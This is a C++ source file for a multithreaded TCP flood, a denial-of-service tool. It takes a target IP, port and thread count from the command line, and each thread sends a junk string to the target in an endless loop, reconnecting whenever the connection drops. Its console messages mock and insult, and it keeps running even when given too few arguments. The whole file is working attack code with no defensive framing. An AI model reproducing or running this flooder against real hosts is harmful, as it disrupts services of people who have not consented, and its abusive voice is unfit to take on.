#include <iostream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstring>
#include <thread>
#include <atomic>
#include <mutex>

using namespace std;

string request = "wkwbckbwkcbwqkcdbqkwbcqkwccqwqc4r234213";
struct sockaddr_in addr;
//mutex mu;

[[noreturn]] void bw_DoWork() {

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    while(sock < 0){

        sock = socket(AF_INET, SOCK_STREAM, 0);
    }

    // Make a connection to the server with socket SendingSocket.

    int RetCode = connect(sock, (struct sockaddr*)&addr, sizeof(addr));

    if (RetCode < 0)

    {

        while(connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0){

            this_thread::sleep_for(chrono::seconds(3));
        }

    }

    else

    {
        printf("Client: connect() is OK, got connected...\n");

    }


    int BytesSent;
    while (true) {
        BytesSent = send(sock, request.c_str(), request.size() + 1, MSG_NOSIGNAL);


        if (BytesSent < 0) {


                while(close(sock) < 0){}

                sock = socket(AF_INET, SOCK_STREAM, 0);

                while(connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0){
                    this_thread::sleep_for(chrono::seconds(3));
                }
                cout << "U cant run away, Mother Fucker!" << endl;

        }

    }


}

int main(int argc, char* argv[])
{
	if(argc < 4) {
		cout << "wrong usage u tard ! Trying to help u here!" << endl;
		cout << "The usage is <command> <target_IP> <target_port> <thread_number>" << endl;
 	}

    bzero(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(stoi(argv[2]));
    addr.sin_addr.s_addr = inet_addr(argv[1]);
	int thread_n = stoi(argv[3]);

    thread array_Thread[thread_n];
    for (auto x = 0; x < thread_n; x++) {
        array_Thread[x] = thread(bw_DoWork);

        cout << x << "creadted !!!" << endl;
    }

    for (auto & i : array_Thread) {
        i.join();
    }

    return 0;
}
